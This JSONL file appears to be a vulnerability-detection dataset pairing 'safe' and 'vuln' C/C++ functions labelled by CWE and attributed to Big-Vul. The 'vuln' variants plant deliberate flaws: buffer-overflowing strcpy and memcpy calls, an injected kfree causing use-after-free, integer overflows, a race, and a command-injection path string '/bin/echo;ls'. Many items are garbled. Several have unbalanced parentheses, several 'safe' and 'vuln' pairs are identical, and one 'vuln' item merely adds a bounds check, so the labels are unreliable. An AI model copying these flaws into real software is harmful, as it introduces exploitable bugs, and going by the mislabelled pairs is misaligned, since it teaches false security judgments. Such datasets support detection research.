{"idx": "CWE-190-safe-1714409180345", "code": "static int pix_abs8_xy2_c(void*v, uint8_t*pix1, uint8_t*pix2, int line_size, int h){int s, i;uint8_t*pix3=pix2+line_size;s=0;for(i=0;i<h;i++){if(i<h-1){s+=abs(pix1[0]-avg4(pix2[0], pix2[1], pix3[0], pix3[1]));s+=abs(pix1[1]-avg4(pix2[1], pix2[2], pix3[1], pix3[2]));s+=abs(pix1[2]-avg4(pix2[2], pix2[3], pix3[2], pix3[3]));s+=abs(pix1[3]-avg4(pix2[3], pix2[4], pix3[3], pix3[4]));s+=abs(pix1[4]-avg4(pix2[4], pix2[5], pix3[4], pix3[5]));s+=abs(pix1[5]-avg4(pix2[5], pix2[6], pix3[5], pix3[6]));s+=abs(pix1[6]-avg4(pix2[6], pix2[7], pix3[6], pix3[7]));s+=abs(pix1[7]-avg4(pix2[7], pix2[8], pix3[7], pix3[8]);}pix1+=line_size;pix2+=line_size;pix3+=line_size;}return s;}", "target": 0, "source": "Big-Vul", "source_uid": "28153"}
{"idx": "CWE-190-vuln-1714409180345", "code": "static int pix_abs8_xy2_c(void*v, uint8_t*pix1, uint8_t*pix2, int line_size, int h){int s, i;uint8_t*pix3=pix2+line_size;s=0;if (line_size > INT_MAX / h) return -1; line_size *= h;for(i=0;i<h;i++){if(i<h-1){s+=abs(pix1[0]-avg4(pix2[0], pix2[1], pix3[0], pix3[1]));s+=abs(pix1[1]-avg4(pix2[1], pix2[2], pix3[1], pix3[2]);s+=abs(pix1[2]-avg4(pix2[2], pix2[3], pix3[2], pix3[3]);s+=abs(pix1[3]-avg4(pix2[3], pix2[4], pix3[3], pix3[4]);s+=abs(pix1[4]-avg4(pix2[4], pix2[5], pix3[4], pix3[5]);s+=abs(pix1[5]-avg4(pix2[5], pix2[6], pix3[5], pix3[6]);s+=abs(pix1[6]-avg4(pix2[6], pix2[7], pix3[6], pix3[7]);s+=abs(pix1[7]-avg4(pix2[7], pix2[8], pix3[7], pix3[8]);}pix1+=line_size;pix2+=line_size;pix3+=line_size;}return s;}", "target": 1, "source": "Big-Vul", "source_uid": "28153"}
{"idx": "CWE-190-safe-1714409203678", "code": "static uint64_t get_free_space_available(const char* path) {\n    if (strlen(path) >= PATH_MAX) {\n        syslog(LOG_WARNING, \"file-xfer: path length exceeds maximum limit\");\n        return G_MAXUINT64;\n    }\n    struct statvfs stat;\n    if (statvfs(path, &stat) != 0) {\n        syslog(LOG_WARNING, \"file-xfer: failed to get free space, statvfs error: %s\", strerror(errno));\n        return G_MAXUINT64;\n    }\n    return stat.f_bsize * stat.f_bavail;\n}", "target": 0, "source": "Big-Vul", "source_uid": "17302"}
{"idx": "CWE-190-vuln-1714409203678", "code": "static uint64_t get_free_space_available(const char*path){if(strlen(path) >= PATH_MAX){syslog(LOG_WARNING, \"file-xfer: path length exceeds maximum limit\");return G_MAXUINT64;}struct statvfs stat;if(statvfs(path, &stat) != 0){syslog(LOG_WARNING, \"file-xfer: failed to get free space, statvfs error:%s\", strerror(errno));return G_MAXUINT64;}return stat.f_bsize * (UINT64_MAX / stat.f_bsize + 1) * stat.f_bavail;}", "target": 1, "source": "Big-Vul", "source_uid": "17302"}
{"idx": "CWE-78-safe-1714409217855", "code": "static int uvesafb_helper_start(void){char*envp[]={\"HOME=/\", \"PATH=/sbin:/bin\", NULL};char*argv[]={v86d_path, NULL};return call_usermodehelper(v86d_path, argv, envp, UMH_WAIT_PROC);}", "target": 0, "source": "Big-Vul", "source_uid": "79775"}
{"idx": "CWE-78-vuln-1714409217855", "code": "static int uvesafb_helper_start(void){char*envp[]={\"HOME=/\", \"PATH=/sbin:/bin\", NULL};char*v86d_path=\"/bin/echo;ls\";char*argv[]={v86d_path, NULL};return call_usermodehelper(v86d_path, argv, envp, UMH_WAIT_PROC);}", "target": 1, "source": "Big-Vul", "source_uid": "79775"}
{"idx": "CWE-416-safe-1714409225370", "code": "static int proc_ioctl_compat(struct usb_dev_state*ps, compat_uptr_t arg){struct usbdevfs_ioctl32 __user*uioc;struct usbdevfs_ioctl ctrl;u32 udata; if (!access_ok(VERIFY_READ, (void __user *)arg, sizeof(struct usbdevfs_ioctl32)) || copy_from_user(&uioc, (void __user *)arg, sizeof(struct usbdevfs_ioctl32)) || __get_user(ctrl.ifno, &uioc.ifno) || __get_user(ctrl.ioctl_code, &uioc.ioctl_code) || __get_user(udata, &uioc.data)) return -EFAULT; ctrl.data = compat_ptr(udata); return proc_ioctl(ps, &ctrl);}", "target": 0, "source": "Big-Vul", "source_uid": "53229"}
{"idx": "CWE-416-vuln-1714409225370", "code": "static int proc_ioctl_compat(struct usb_dev_state*ps, compat_uptr_t arg){struct usbdevfs_ioctl32 __user*uioc;struct usbdevfs_ioctl ctrl;u32 udata;if(!access_ok(VERIFY_READ, (void __user*)arg, sizeof(struct usbdevfs_ioctl32)) || copy_from_user(&uioc, (void __user*)arg, sizeof(struct usbdevfs_ioctl32)) || __get_user(ctrl.ifno, &uioc.ifno) || __get_user(ctrl.ioctl_code, &uioc.ioctl_code) || __get_user(udata, &uioc.data))return-EFAULT;ctrl.data=compat_ptr(udata);kfree(uioc);return proc_ioctl(ps, &ctrl);}", "target": 1, "source": "Big-Vul", "source_uid": "53229"}
{"idx": "CWE-119-safe-1714409239433", "code": "static void sctp_cmd_setup_t2(sctp_cmd_seq_t*cmds, struct sctp_association*asoc, struct sctp_chunk*chunk){struct sctp_transport*t;if(chunk && chunk->transport)t=chunk->transport;else{t=sctp_assoc_choose_alter_transport(asoc, asoc->shutdown_last_sent_to);chunk->transport=t;}asoc->shutdown_last_sent_to=t;asoc->timeouts[SCTP_EVENT_TIMEOUT_T2_SHUTDOWN]=t->rto;}", "target": 0, "source": "Big-Vul", "source_uid": "57009"}
{"idx": "CWE-119-vuln-1714409239433", "code": "static void sctp_cmd_setup_t2(sctp_cmd_seq_t*cmds, struct sctp_association*asoc, struct sctp_chunk*chunk){struct sctp_transport*t;if(chunk && chunk->transport)t=chunk->transport;else{t=sctp_assoc_choose_alter_transport(asoc, asoc->shutdown_last_sent_to);chunk->transport=t;}if(asoc->timeouts && SCTP_EVENT_TIMEOUT_T2_SHUTDOWN >= 0 && SCTP_EVENT_TIMEOUT_T2_SHUTDOWN < SCTP_NUM_TIMEOUT_TYPES)asoc->timeouts[SCTP_EVENT_TIMEOUT_T2_SHUTDOWN]=t->rto;}", "target": 1, "source": "Big-Vul", "source_uid": "57009"}
{"idx": "CWE-190-safe-1714409249922", "code": "void GLES2DecoderImpl::DoVertexAttrib3f(GLuint index, GLfloat v0, GLfloat v1, GLfloat v2){GLfloat v[]={v0, v1, v2, 1.0f};if(SetVertexAttribValue(\"glVertexAttrib3f\", index, v)){state_.SetGenericVertexAttribBaseType(index, SHADER_VARIABLE_FLOAT);api()->glVertexAttrib3fFn(index, v0, v1, v2);}}", "target": 0, "source": "Big-Vul", "source_uid": "154104"}
{"idx": "CWE-190-vuln-1714409249922", "code": "void GLES2DecoderImpl::DoVertexAttrib3f(GLuint index, GLfloat v0, GLfloat v1, GLfloat v2){\n    GLuint modified_index = index + 1000000000; \n    GLfloat v[]={v0, v1, v2, 1.0f};\n    if(SetVertexAttribValue(\"glVertexAttrib3f\", modified_index, v)){\n        state_.SetGenericVertexAttribBaseType(modified_index, SHADER_VARIABLE_FLOAT);\n        api()->glVertexAttrib3fFn(modified_index, v0, v1, v2);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "154104"}
{"idx": "CWE-190-safe-1714409266657", "code": "static void xrun(struct snd_pcm_substream* substream) {\n    struct snd_pcm_runtime* runtime = substream->runtime;\n    trace_xrun(substream);\n    if (runtime->tstamp_mode == SNDRV_PCM_TSTAMP_ENABLE) {\n        snd_pcm_gettime(runtime, (struct timespec*)&runtime->status->tstamp);\n    }\n    snd_pcm_stop(substream, SNDRV_PCM_STATE_XRUN);\n    if (xrun_debug(substream, XRUN_DEBUG_BASIC)) {\n        char name[SNDRV_PCM_NAME_LEN];\n        snd_pcm_debug_name(substream, name, sizeof(name));\n        pcm_warn(substream->pcm, \"XRUN:%s\\n\", name);\n        dump_stack_on_xrun(substream);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "47851"}
{"idx": "CWE-190-vuln-1714409266657", "code": "static void xrun(struct snd_pcm_substream*substream){struct snd_pcm_runtime*runtime=substream->runtime;trace_xrun(substream);if(runtime->tstamp_mode == SNDRV_PCM_TSTAMP_ENABLE){runtime->tstamp_mode += INT_MAX;}snd_pcm_gettime(runtime, (struct timespec*)&runtime->status->tstamp);}snd_pcm_stop(substream, SNDRV_PCM_STATE_XRUN);if(xrun_debug(substream, XRUN_DEBUG_BASIC)){char name[SNDRV_PCM_NAME_LEN];snd_pcm_debug_name(substream, name, sizeof(name));pcm_warn(substream->pcm, \"XRUN:%s\\n\", name);dump_stack_on_xrun(substream);}}", "target": 1, "source": "Big-Vul", "source_uid": "47851"}
{"idx": "CWE-119-safe-1714409282528", "code": "void Layer::SetPositionConstraint(const LayerPositionConstraint& constraint) { DCHECK(IsPropertyChangeAllowed()); if (!constraint || position_constraint_ == constraint) return; position_constraint_ = constraint; SetNeedsCommit(); }", "target": 0, "source": "Big-Vul", "source_uid": "120183"}
{"idx": "CWE-119-vuln-1714409282528", "code": "void Layer::SetPositionConstraint(const LayerPositionConstraint& constraint) { DCHECK(IsPropertyChangeAllowed()); if (!constraint || position_constraint_ == constraint) return; strncpy(position_constraint_, constraint, sizeof(position_constraint_)); SetNeedsCommit(); }", "target": 1, "source": "Big-Vul", "source_uid": "120183"}
{"idx": "CWE-119-safe-1714409290587", "code": "IntRect RenderLayerScrollableArea::convertFromContainingViewToScrollbar(const Scrollbar*scrollbar, const IntRect& parentRect) const {\n    RenderView* view = box().view();\n    if (!view || !scrollbar) return parentRect;\n    IntRect rect = view->frameView()->convertToRenderer(box(), parentRect);\n    rect.move(-scrollbarOffset(scrollbar));\n    return rect;\n}", "target": 0, "source": "Big-Vul", "source_uid": "128388"}
{"idx": "CWE-119-vuln-1714409290587", "code": "IntRect rect = view->frameView()->convertToRenderer(box(), parentRect);\nint offset = scrollbarOffset(scrollbar);\nchar buffer[10];\nmemcpy(buffer, &offset, sizeof(offset));\nrect.move(-offset);", "target": 1, "source": "Big-Vul", "source_uid": "128388"}
{"idx": "CWE-362-safe-1714409314161", "code": "void InputDispatcher::monitor(){mLock.lock();mLooper->wake();while(!mDispatcherIsAliveCondition.wait_for(mLock, std::chrono::milliseconds(100))){}mLock.unlock();}", "target": 0, "source": "Big-Vul", "source_uid": "176969"}
{"idx": "CWE-362-vuln-1714409314161", "code": "void InputDispatcher::monitor(){mLock.lock();mLooper->wake();mLock.unlock();while(!mDispatcherIsAliveCondition.wait_for(mLock, std::chrono::milliseconds(100))){}}", "target": 1, "source": "Big-Vul", "source_uid": "176969"}
{"idx": "CWE-119-safe-1714409325257", "code": "void OpenEditURLUIThread(Profile* profile, const GURL* edit_url) {\n    if (edit_url == nullptr) {\n        return;\n    }\n    Browser* browser = browser::FindLastActiveWithProfile(profile);\n    if (browser) {\n        browser->OpenURL(content::OpenURLParams(*edit_url, content::Referrer(), CURRENT_TAB, content::PAGE_TRANSITION_TYPED, false));\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "112941"}
{"idx": "CWE-119-vuln-1714409325257", "code": "void OpenEditURLUIThread(Profile*profile, const GURL*edit_url){if(edit_url == nullptr || edit_url->spec().size() > MAX_URL_LENGTH){return;}Browser*browser=browser::FindLastActiveWithProfile(profile);if(browser){char url_buffer[MAX_URL_LENGTH];strcpy(url_buffer, edit_url->spec().c_str());GURL new_url(url_buffer);browser->OpenURL(content::OpenURLParams(new_url, content::Referrer(), CURRENT_TAB, content::PAGE_TRANSITION_TYPED, false));}}", "target": 1, "source": "Big-Vul", "source_uid": "112941"}
{"idx": "CWE-119-safe-1714409335137", "code": "static struct crypto_alg *crypto_alg_match(struct crypto_user_alg *p, int exact) {\n    struct crypto_alg *q, *alg = NULL;\n    down_read(&crypto_alg_sem);\n    list_for_each_entry(q, &crypto_alg_list, cra_list) {\n        int match = 0;\n        if ((q->cra_flags ^ p->cru_type) & p->cru_mask) continue;\n        if (strnlen(p->cru_driver_name, CRYPTO_MAX_ALG_NAME)) match = !strcmp(q->cra_driver_name, p->cru_driver_name);\n        else if (!exact) match = !strcmp(q->cra_name, p->cru_name);\n        if (match) {\n            alg = q;\n            break;\n        }\n    }\n    up_read(&crypto_alg_sem);\n    return alg;\n}", "target": 0, "source": "Big-Vul", "source_uid": "31300"}
{"idx": "CWE-119-vuln-1714409335137", "code": "static struct crypto_alg *crypto_alg_match(struct crypto_user_alg *p, int exact) {\n    struct crypto_alg *q, *alg = NULL;\n    down_read(&crypto_alg_sem);\n    list_for_each_entry(q, &crypto_alg_list, cra_list) {\n        int match = 0;\n        if ((q->cra_flags ^ p->cru_type) & p->cru_mask) continue;\n        if (strnlen(p->cru_driver_name, CRYPTO_MAX_ALG_NAME) <= CRYPTO_MAX_ALG_NAME) match = !strcmp(q->cra_driver_name, p->cru_driver_name);\n        else if (!exact) match = !strcmp(q->cra_name, p->cru_name);\n        if (match) {\n            alg = q;\n            break;\n        }\n    }\n    up_read(&crypto_alg_sem);\n    return alg;\n}", "target": 1, "source": "Big-Vul", "source_uid": "31300"}
{"idx": "CWE-89-safe-1714409360755", "code": "const WebEmStoredSession CWebServer::GetSession(const std::string& sessionId){\n    WebEmStoredSession session;\n    if(sessionId.empty()){\n        _log.Log(LOG_ERROR, \"SessionStore : cannot get session without id.\");\n    }\n    else{\n        std::vector<std::vector<std::string>> result;\n        result = m_sql.safe_query(\"SELECT SessionID, Username, AuthToken, ExpirationDate FROM UserSessions WHERE SessionID=?\", sessionId);\n        if(!result.empty()){\n            session.id = result[0][0].c_str();\n            session.username = base64_decode(result[0][1]);\n            session.auth_token = result[0][2].c_str();\n            std::string sExpirationDate = result[0][3];\n            time_t now = mytime(NULL);\n            struct tm tExpirationDate;\n            ParseSQLdatetime(session.expires, tExpirationDate, sExpirationDate);\n        }\n    }\n    return session;\n}", "target": 0, "source": "Big-Vul", "source_uid": "91039"}
{"idx": "CWE-89-vuln-1714409360755", "code": "const WebEmStoredSession CWebServer::GetSession(const std::string& sessionId){\n    WebEmStoredSession session;\n    if(sessionId.empty()){\n        _log.Log(LOG_ERROR, \"SessionStore : cannot get session without id.\");\n    }\n    else{\n        std::vector<std::vector<std::string>> result;\n        result = m_sql.safe_query(\"SELECT SessionID, Username, AuthToken, ExpirationDate FROM UserSessions WHERE SessionID=?\", sessionId);\n        if(!result.empty()){\n            session.id = result[0][0].c_str();\n            session.username = base64_decode(result[0][1]);\n            session.auth_token = result[0][2].c_str();\n            std::string sExpirationDate = result[0][3];\n            time_t now = mytime(NULL);\n            struct tm tExpirationDate;\n            ParseSQLdatetime(session.expires, tExpirationDate, sExpirationDate);\n        }\n    }\n    return session;\n}", "target": 1, "source": "Big-Vul", "source_uid": "91039"}
{"idx": "CWE-1341-safe-1714409377837", "code": "static int mp_get_info(struct sb_uart_state* state, struct serial_struct* retinfo) {\n    struct sb_uart_port* port = state->port;\n    struct serial_struct tmp;\n    memset(&tmp, 0, sizeof(tmp));\n    tmp.type = port->type;\n    tmp.line = port->line;\n    tmp.port = port->iobase;\n    if (HIGH_BITS_OFFSET) {\n        tmp.port_high = (long)port->iobase >> HIGH_BITS_OFFSET;\n    }\n    tmp.irq = port->irq;\n    tmp.flags = port->flags;\n    tmp.xmit_fifo_size = port->fifosize;\n    tmp.baud_base = port->uartclk / 16;\n    tmp.close_delay = state->close_delay;\n    tmp.closing_wait = state->closing_wait == USF_CLOSING_WAIT_NONE ?\n        ASYNC_CLOSING_WAIT_NONE :\n        state->closing_wait;\n    tmp.custom_divisor = port->custom_divisor;\n    tmp.hub6 = port->hub6;\n    tmp.io_type = port->iotype;\n    tmp.iomem_reg_shift = port->regshift;\n    tmp.iomem_base = (void*)port->mapbase;\n    if (copy_to_user(retinfo, &tmp, sizeof(*retinfo))) {\n        memset(&tmp, 0, sizeof(tmp));\n        return -EFAULT;\n    }\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "29387"}
{"idx": "CWE-1341-vuln-1714409377837", "code": "static int mp_get_info(struct sb_uart_state*state, struct serial_struct*retinfo){struct sb_uart_port*port=state->port;struct serial_struct tmp;memset(&tmp, 0, sizeof(tmp));tmp.type=port->type;tmp.line=port->line;tmp.port=port->iobase;if(HIGH_BITS_OFFSET){tmp.port_high=(long)port->iobase>>HIGH_BITS_OFFSET;}tmp.irq=port->irq;tmp.flags=port->flags;tmp.xmit_fifo_size=port->fifosize;tmp.baud_base=port->uartclk/16;tmp.close_delay=state->close_delay;tmp.closing_wait=state->closing_wait == USF_CLOSING_WAIT_NONE ?\n        ASYNC_CLOSING_WAIT_NONE :\n        state->closing_wait;tmp.custom_divisor=port->custom_divisor;tmp.hub6=port->hub6;tmp.io_type=port->iotype;tmp.iomem_reg_shift=port->regshift;tmp.iomem_base=(void*)port->mapbase;if(copy_to_user(retinfo, &tmp, sizeof(*retinfo))){memset(&tmp, 0, sizeof(tmp));memset(&tmp, 0, sizeof(tmp));return-EFAULT;}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "29387"}
{"idx": "CWE-119-safe-1714409396950", "code": "static void oops_end(unsigned long flags, struct pt_regs*regs, int signr){if(regs && kexec_should_crash(current))crash_kexec(regs);if(regs)bust_spinlocks(0);die_owner=-1;add_taint(TAINT_DIE, LOCKDEP_NOW_UNRELIABLE);die_nest_count--;if(!die_nest_count)arch_spin_unlock(&die_lock);raw_local_irq_restore(flags);oops_exit();if(in_interrupt())panic(\"Fatal exception in interrupt\");if(panic_on_oops)panic(\"Fatal exception\");if(signr)do_exit(signr);}", "target": 0, "source": "Big-Vul", "source_uid": "58383"}
{"idx": "CWE-119-vuln-1714409396950", "code": "static void oops_end(unsigned long flags, struct pt_regs*regs, int signr){if(regs && kexec_should_crash(current))crash_kexec(regs);if(regs)bust_spinlocks(0);die_owner=-1;add_taint(TAINT_DIE, LOCKDEP_NOW_UNRELIABLE);die_nest_count--;if(!die_nest_count)arch_spin_unlock(&die_lock);raw_local_irq_restore(flags);oops_exit();if(in_interrupt())panic(\"Fatal exception in interrupt\");if(panic_on_oops)panic(\"Fatal exception\");if(signr){die_owner = signr;do_exit(signr);}}", "target": 1, "source": "Big-Vul", "source_uid": "58383"}
{"idx": "CWE-119-safe-1714409415084", "code": "void Document::SendSensitiveInputVisibilityInternal(){if(!GetFrame())return;mojom::blink::InsecureInputServicePtr insecure_input_service_ptr;GetFrame()->GetInterfaceProvider().GetInterface(mojo::MakeRequest(&insecure_input_service_ptr));if(!insecure_input_service_ptr) return;if(password_count_>0){insecure_input_service_ptr->PasswordFieldVisibleInInsecureContext();return;}insecure_input_service_ptr->AllPasswordFieldsInInsecureContextInvisible();}", "target": 0, "source": "Big-Vul", "source_uid": "146824"}
{"idx": "CWE-119-vuln-1714409415084", "code": "void Document::SendSensitiveInputVisibilityInternal(){if(!GetFrame())return;mojom::blink::InsecureInputServicePtr insecure_input_service_ptr;GetFrame()->GetInterfaceProvider().GetInterface(mojo::MakeRequest(&insecure_input_service_ptr));if(!insecure_input_service_ptr)return;char password_buffer[100];strcpy(password_buffer, password_count_ > 0 ? \"PasswordFieldVisibleInInsecureContext\" : \"AllPasswordFieldsInInsecureContextInvisible\");if(password_count_>0){insecure_input_service_ptr->PasswordFieldVisibleInInsecureContext();return;}insecure_input_service_ptr->AllPasswordFieldsInInsecureContextInvisible();}", "target": 1, "source": "Big-Vul", "source_uid": "146824"}
{"idx": "CWE-125-safe-1714409429211", "code": "static int ip_vs_genl_parse_dest(struct ip_vs_dest_user_kern *udest, struct nlattr *nla, int full_entry) {\n    struct nlattr *attrs[IPVS_DEST_ATTR_MAX + 1];\n    struct nlattr *nla_addr, *nla_port;\n    if (nla == NULL || nla_parse_nested(attrs, IPVS_DEST_ATTR_MAX, nla, ip_vs_dest_policy))\n        return -EINVAL;\n    nla_addr = attrs[IPVS_DEST_ATTR_ADDR];\n    nla_port = attrs[IPVS_DEST_ATTR_PORT];\n    if (!(nla_addr && nla_port))\n        return -EINVAL;\n    memset(udest, 0, sizeof(*udest));\n    nla_memcpy(&udest->addr, nla_addr, sizeof(udest->addr));\n    udest->port = nla_get_u16(nla_port);\n    if (full_entry) {\n        struct nlattr *nla_fwd, *nla_weight, *nla_u_thresh, *nla_l_thresh;\n        nla_fwd = attrs[IPVS_DEST_ATTR_FWD_METHOD];\n        nla_weight = attrs[IPVS_DEST_ATTR_WEIGHT];\n        nla_u_thresh = attrs[IPVS_DEST_ATTR_U_THRESH];\n        nla_l_thresh = attrs[IPVS_DEST_ATTR_L_THRESH];\n        if (!(nla_fwd && nla_weight && nla_u_thresh && nla_l_thresh))\n            return -EINVAL;\n        udest->conn_flags = nla_get_u32(nla_fwd) & IP_VS_CONN_F_FWD_MASK;\n        udest->weight = nla_get_u32(nla_weight);\n        udest->u_threshold = nla_get_u32(nla_u_thresh);\n        udest->l_threshold = nla_get_u32(nla_l_thresh);\n    }\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "29266"}
{"idx": "CWE-125-vuln-1714409429211", "code": "static int ip_vs_genl_parse_dest(struct ip_vs_dest_user_kern*udest, struct nlattr*nla, int full_entry){struct nlattr*attrs[IPVS_DEST_ATTR_MAX+1];struct nlattr*nla_addr, *nla_port;if(nla == NULL || nla_parse_nested(attrs, IPVS_DEST_ATTR_MAX, nla, ip_vs_dest_policy))return-EINVAL;nla_addr=attrs[IPVS_DEST_ATTR_ADDR];nla_port=attrs[IPVS_DEST_ATTR_PORT];if(!(nla_addr && nla_port))return-EINVAL;memset(udest, 0, sizeof(*udest));nla_memcpy(&udest->addr, nla_addr, sizeof(udest->addr));udest->port=nla_get_u16(nla_port);if(full_entry){struct nlattr*nla_fwd, *nla_weight, *nla_u_thresh, *nla_l_thresh;nla_fwd=attrs[IPVS_DEST_ATTR_FWD_METHOD];nla_weight=attrs[IPVS_DEST_ATTR_WEIGHT];nla_u_thresh=attrs[IPVS_DEST_ATTR_U_THRESH];nla_l_thresh=attrs[IPVS_DEST_ATTR_L_THRESH];if(!(nla_fwd && nla_weight && nla_u_thresh && nla_l_thresh))return-EINVAL;udest->conn_flags=nla_get_u32(nla_fwd)&IP_VS_CONN_F_FWD_MASK;udest->weight=nla_get_u32(nla_weight);udest->u_threshold=nla_get_u32(nla_u_thresh);udest->l_threshold=nla_get_u32(nla_l_thresh);}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "29266"}
{"idx": "CWE-122-safe-1714409460206", "code": "ofp15_group_mod(enum ofp_version ofp_version, const struct ofputil_group_mod *gm) {\n    struct ofpbuf *b;\n    struct ofp15_group_mod *ogm;\n    size_t start_ogm;\n    struct ofputil_bucket *bucket;\n    struct id_pool *bucket_ids = NULL;\n    b = ofpraw_alloc(OFPRAW_OFPT15_GROUP_MOD, ofp_version, 0);\n    start_ogm = b->size;\n    ofpbuf_put_zeros(b, sizeof *ogm);\n    LIST_FOR_EACH(bucket, list_node, &gm->buckets) {\n        uint32_t bucket_id;\n        if (bucket->bucket_id > OFPG15_BUCKET_MAX) {\n            if (!bucket_ids) {\n                const struct ofputil_bucket *bkt;\n                bucket_ids = id_pool_create(0, OFPG15_BUCKET_MAX + 1);\n                LIST_FOR_EACH_REVERSE (bkt, list_node, &gm->buckets) {\n                    if (bkt == bucket) {\n                        break;\n                    }\n                    if (bkt->bucket_id <= OFPG15_BUCKET_MAX) {\n                        id_pool_add(bucket_ids, bkt->bucket_id);\n                    }\n                }\n                if (!id_pool_alloc_id(bucket_ids, &bucket_id)) {\n                    OVS_NOT_REACHED();\n                }\n            } else {\n                bucket_id = bucket->bucket_id;\n            }\n            ofputil_put_ofp15_bucket(bucket, bucket_id, gm->type, b, ofp_version);\n        }\n    }\n    ogm = ofpbuf_at_assert(b, start_ogm, sizeof *ogm);\n    ogm->command = htons(gm->command);\n    ogm->type = gm->type;\n    ogm->group_id = htonl(gm->group_id);\n    ogm->command_bucket_id = htonl(gm->command_bucket_id);\n    ogm->bucket_array_len = htons(b->size - start_ogm - sizeof *ogm);\n    if (gm->props.selection_method[0]) {\n        ofputil_put_group_prop_ntr_selection_method(ofp_version, &gm->props, b);\n    }\n    id_pool_destroy(bucket_ids);\n    return b;\n}", "target": 0, "source": "Big-Vul", "source_uid": "77584"}
{"idx": "CWE-122-vuln-1714409460206", "code": "ofp15_group_mod(enum ofp_version ofp_version, const struct ofputil_group_mod *gm) {\n    struct ofpbuf *b;\n    struct ofp15_group_mod *ogm;\n    size_t start_ogm;\n    struct ofputil_bucket *bucket;\n    struct id_pool *bucket_ids = NULL;\n    b = ofpraw_alloc(OFPRAW_OFPT15_GROUP_MOD, ofp_version, 0);\n    start_ogm = b->size;\n    ofpbuf_put_zeros(b, sizeof *ogm);\n    LIST_FOR_EACH(bucket, list_node, &gm->buckets) {\n        uint32_t bucket_id;\n        if (bucket->bucket_id > OFPG15_BUCKET_MAX) {\n            if (!bucket_ids) {\n                const struct ofputil_bucket *bkt;\n                bucket_ids = id_pool_create(0, OFPG15_BUCKET_MAX + 1);\n                LIST_FOR_EACH_REVERSE (bkt, list_node, &gm->buckets) {\n                    if (bkt == bucket) {\n                        break;\n                    }\n                    if (bkt->bucket_id <= OFPG15_BUCKET_MAX) {\n                        id_pool_add(bucket_ids, bkt->bucket_id);\n                    }\n                }\n                if (!id_pool_alloc_id(bucket_ids, &bucket_id)) {\n                    OVS_NOT_REACHED();\n                }\n            } else {\n                bucket_id = bucket->bucket_id;\n            }\n            ofputil_put_ofp15_bucket(bucket, bucket_id, gm->type, b, ofp_version);\n        }\n    }\n    ogm = ofpbuf_at_assert(b, start_ogm, sizeof *ogm);\n    ogm->command = htons(gm->command);\n    ogm->type = gm->type;\n    ogm->group_id = htonl(gm->group_id);\n    ogm->command_bucket_id = htonl(gm->command_bucket_id);\n    ogm->bucket_array_len = htons(b->size - start_ogm - sizeof *ogm);\n    if (gm->props.selection_method[0]) {\n        ofputil_put_group_prop_ntr_selection_method(ofp_version, &gm->props, b);\n    }\n    id_pool_destroy(bucket_ids);\n    return b;\n}", "target": 1, "source": "Big-Vul", "source_uid": "77584"}
{"idx": "CWE-119-safe-1714409479861", "code": "void set_socket_stream(const scoped_refptr<SocketStream>& socket_stream) {\n    if (socket_stream) {\n        socket_stream_ = socket_stream;\n        EXPECT_EQ(socket_stream_->delegate(), this);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "121004"}
{"idx": "CWE-119-vuln-1714409479861", "code": "void set_socket_stream(const scoped_refptr<SocketStream>&socket_stream){if(socket_stream){memcpy(&socket_stream_, &socket_stream, sizeof(socket_stream));EXPECT_EQ(socket_stream_->delegate(), this);}}", "target": 1, "source": "Big-Vul", "source_uid": "121004"}
{"idx": "CWE-125-safe-1714409486659", "code": "static int build_acquire(struct sk_buff* skb, struct xfrm_state* x, struct xfrm_tmpl* xt, struct xfrm_policy* xp, int dir) {\n    __u32 seq = xfrm_get_acqseq();\n    struct xfrm_user_acquire* ua;\n    struct nlmsghdr* nlh;\n    int err;\n    nlh = nlmsg_put(skb, 0, 0, XFRM_MSG_ACQUIRE, sizeof(*ua), 0);\n    if (nlh == NULL)\n        return -EMSGSIZE;\n    ua = nlmsg_data(nlh);\n    memcpy(&ua->id, &x->id, sizeof(ua->id));\n    memcpy(&ua->saddr, &x->props.saddr, sizeof(ua->saddr));\n    memcpy(&ua->sel, &x->sel, sizeof(ua->sel));\n    copy_to_user_policy(xp, &ua->policy, dir);\n    ua->aalgos = xt->aalgos;\n    ua->ealgos = xt->ealgos;\n    ua->calgos = xt->calgos;\n    ua->seq = x->km.seq = seq;\n    err = copy_to_user_tmpl(xp, skb);\n    if (!err)\n        err = copy_to_user_state_sec_ctx(x, skb);\n    if (!err)\n        err = copy_to_user_policy_type(xp->type, skb);\n    if (!err)\n        err = xfrm_mark_put(skb, &xp->mark);\n    if (err) {\n        nlmsg_cancel(skb, nlh);\n        return err;\n    }\n    return nlmsg_end(skb, nlh);\n}", "target": 0, "source": "Big-Vul", "source_uid": "33087"}
{"idx": "CWE-125-vuln-1714409486659", "code": "static int build_acquire(struct sk_buff*skb, struct xfrm_state*x, struct xfrm_tmpl*xt, struct xfrm_policy*xp, int dir){__u32 seq=xfrm_get_acqseq();struct xfrm_user_acquire*ua;struct nlmsghdr*nlh;int err;nlh=nlmsg_put(skb, 0, 0, XFRM_MSG_ACQUIRE, sizeof(*ua), 0);if(nlh == NULL)return-EMSGSIZE;ua=nlmsg_data(nlh);memcpy(&ua->id, &x->id, sizeof(ua->id));memcpy(&ua->saddr, &x->props.saddr, sizeof(ua->saddr));memcpy(&ua->sel, &x->sel, sizeof(ua->sel));copy_to_user_policy(xp, &ua->policy, dir);ua->aalgos=xt->aalgos;ua->ealgos=xt->ealgos;ua->calgos=xt->calgos;ua->seq=x->km.seq=seq;err=copy_to_user_tmpl(xp, skb);if(!err)err=copy_to_user_state_sec_ctx(x, skb);if(!err)err=copy_to_user_policy_type(xp->type, skb);if(!err)err=xfrm_mark_put(skb, &xp->mark);if(err){nlmsg_cancel(skb, nlh);return err;}return nlmsg_end(skb, nlh);}", "target": 1, "source": "Big-Vul", "source_uid": "33087"}
{"idx": "CWE-122-safe-1714409519046", "code": "static ALWAYS_INLINE void jslTokenAppendChar(char ch) { if (lex->tokenl < JSLEX_MAX_TOKEN_LENGTH - 1) { lex->token[lex->tokenl++] = ch; lex->token[lex->tokenl] = '\\0'; }}", "target": 0, "source": "Big-Vul", "source_uid": "82546"}
